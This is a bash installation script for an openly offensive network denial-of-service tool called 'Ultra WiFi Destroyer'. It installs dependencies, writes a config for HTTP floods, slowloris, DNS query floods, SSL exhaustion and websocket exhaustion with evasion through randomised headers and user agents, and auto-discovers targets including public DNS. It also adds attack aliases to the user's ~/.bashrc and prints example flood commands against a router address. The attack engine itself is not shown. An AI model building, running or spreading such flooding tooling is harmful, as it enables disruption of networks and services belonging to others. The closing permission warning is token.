#!/bin/bash

# Ultra WiFi Destroyer Installation Script
# ========================================

echo "💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀"
echo "║                                                              ║"
echo "║         ULTRA WiFi DESTROYER - INSTALLATION                 ║"
echo "║                    💀 NO ROOT REQUIRED 💀                   ║"
echo "║                                                              ║"
echo "║  🔥 SIÊU MẠNH - WIFI KHÓC XIN THA EDITION 🔥                ║"
echo "💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀"
echo

# Check system requirements
echo "💀 Checking system requirements..."

# Check Python version
PYTHON_VERSION=$(python3 --version 2>&1 | awk '{print $2}' | cut -d. -f1,2)
REQUIRED_VERSION="3.7"

if [[ $(echo "$PYTHON_VERSION >= $REQUIRED_VERSION" | bc -l) -eq 1 ]]; then
    echo "✅ Python $PYTHON_VERSION detected (required: $REQUIRED_VERSION+)"
else
    echo "❌ Python $REQUIRED_VERSION+ required! Current: $PYTHON_VERSION"
    exit 1
fi

# Check pip
if ! command -v pip3 &> /dev/null; then
    echo "❌ pip3 not found! Installing..."
    sudo apt-get update && sudo apt-get install -y python3-pip
fi

# System info
CPU_CORES=$(nproc)
RAM_GB=$(free -g | awk '/^Mem:/{print $2}')
echo "💀 System specs: $CPU_CORES CPU cores, ${RAM_GB}GB RAM"
echo "💀 Maximum devastation threads: $((CPU_CORES * 200))"

if [[ $CPU_CORES -lt 4 ]]; then
    echo "⚠️  WARNING: Less than 4 CPU cores detected. Devastation may be limited."
fi

if [[ $RAM_GB -lt 4 ]]; then
    echo "⚠️  WARNING: Less than 4GB RAM detected. Consider reducing thread count."
fi

# Install Python dependencies
echo "💀 Installing Python devastation libraries..."

# Upgrade pip first
python3 -m pip install --upgrade pip

# Install ultra requirements
if [[ -f "ultra_requirements.txt" ]]; then
    echo "💀 Installing from ultra_requirements.txt..."
    python3 -m pip install -r ultra_requirements.txt
else
    echo "💀 Installing individual packages..."
    python3 -m pip install requests>=2.28.0 urllib3>=1.26.0 dnspython>=2.2.0
    python3 -m pip install aiohttp>=3.8.0 websockets>=11.0.0 certifi>=2022.0.0
    python3 -m pip install charset-normalizer>=2.0.0 idna>=3.0.0
fi

# Install optional performance packages
echo "💀 Installing performance optimization packages..."
python3 -m pip install uvloop 2>/dev/null || echo "⚠️  uvloop not available (Linux only)"
python3 -m pip install cchardet 2>/dev/null || echo "⚠️  cchardet not available"

# Make scripts executable
echo "💀 Setting up devastation scripts..."
chmod +x wifi_ultra_noroot.py 2>/dev/null || echo "⚠️  wifi_ultra_noroot.py not found"
chmod +x ultra_destroyer.sh 2>/dev/null || echo "⚠️  ultra_destroyer.sh not found"
chmod +x ultra_install.sh

# Create devastation config
echo "💀 Creating devastation configuration..."
cat > ultra_config.json << EOF
{
  "devastation_settings": {
    "max_processes": $(($CPU_CORES * 4)),
    "max_threads_per_process": 200,
    "default_duration": 300,
    "ultra_mode": true,
    "devastation_level": "MAXIMUM"
  },
  "target_settings": {
    "auto_discover": true,
    "include_public_dns": true,
    "scan_common_ports": [80, 443, 8080, 8443, 3000, 5000, 8000, 9000],
    "aggressive_scanning": true
  },
  "attack_settings": {
    "http_connections_per_process": 1000,
    "dns_queries_per_second": 50000,
    "slowloris_connections": 5000,
    "websocket_connections": 1500,
    "ssl_exhaustion_connections": 3000
  },
  "evasion_settings": {
    "randomize_user_agents": true,
    "randomize_headers": true,
    "randomize_payloads": true,
    "use_session_pools": true
  }
}
EOF

# Performance tuning
echo "💀 Applying system performance tuning..."

# Increase file descriptor limits (temporary)
ulimit -n 65536 2>/dev/null || echo "⚠️  Could not increase file descriptor limit"

# Network performance tuning (if possible)
echo "💀 Checking network performance settings..."
if [[ -w /proc/sys/net/core/rmem_max ]]; then
    echo "💀 Tuning network buffers..."
    echo 134217728 > /proc/sys/net/core/rmem_max 2>/dev/null || true
    echo 134217728 > /proc/sys/net/core/wmem_max 2>/dev/null || true
fi

# Test installation
echo "💀 Testing devastation capabilities..."

# Test basic imports
python3 -c "
import requests, aiohttp, websockets, dns.resolver, asyncio, concurrent.futures
print('✅ All devastation libraries imported successfully')
" 2>/dev/null || {
    echo "❌ Some libraries failed to import. Check installation."
    exit 1
}

# Test basic functionality
if [[ -f "wifi_ultra_noroot.py" ]]; then
    echo "💀 Testing ultra destroyer..."
    python3 wifi_ultra_noroot.py --discover-ultra &
    DISCOVER_PID=$!
    sleep 3
    kill $DISCOVER_PID 2>/dev/null || true
    wait $DISCOVER_PID 2>/dev/null || true
    echo "✅ Ultra destroyer test completed"
fi

# Create quick launch aliases
echo "💀 Creating quick launch commands..."
cat >> ~/.bashrc << EOF

# Ultra WiFi Destroyer aliases
alias ultra-destroyer='cd $(pwd) && ./ultra_destroyer.sh'
alias wifi-devastation='cd $(pwd) && python3 wifi_ultra_noroot.py'
alias ultra-discovery='cd $(pwd) && python3 wifi_ultra_noroot.py --discover-ultra'

EOF

echo
echo "💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀"
echo "║                                                              ║"
echo "║              ULTRA DESTROYER INSTALLATION COMPLETE!         ║"
echo "║                                                              ║"
echo "💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀"
echo
echo "🚀 DEVASTATION READY! Available commands:"
echo "   ./ultra_destroyer.sh          - Interactive devastation menu"
echo "   python3 wifi_ultra_noroot.py  - Direct command line devastation"
echo "   ultra-destroyer               - Quick alias (after restart)"
echo
echo "💀 ULTRA ATTACK EXAMPLES:"
echo "   # Ultra HTTP devastation"
echo "   python3 wifi_ultra_noroot.py --ultra-http -t http://192.168.1.1 --processes 8 --threads 200"
echo
echo "   # Ultra multi-devastation (ALL ATTACKS)"
echo "   python3 wifi_ultra_noroot.py --ultra-multi --duration 300"
echo
echo "   # Quick devastation"
echo "   ./ultra_destroyer.sh"
echo
echo "💀 SYSTEM CAPABILITIES:"
echo "   - Max processes: $(($CPU_CORES * 4))"
echo "   - Max threads: $(($CPU_CORES * 200))"
echo "   - Estimated max RPS: $(($CPU_CORES * 10000))"
echo "   - Devastation level: MAXIMUM 💀"
echo
echo "⚠️  WARNING: This tool is EXTREMELY powerful!"
echo "⚠️  Only use on networks you own or have permission to test!"
echo "⚠️  Can cause significant network disruption!"
echo
echo "💀 WiFi will definitely cry with this setup! 😈"
echo "💀 Use responsibly and legally!"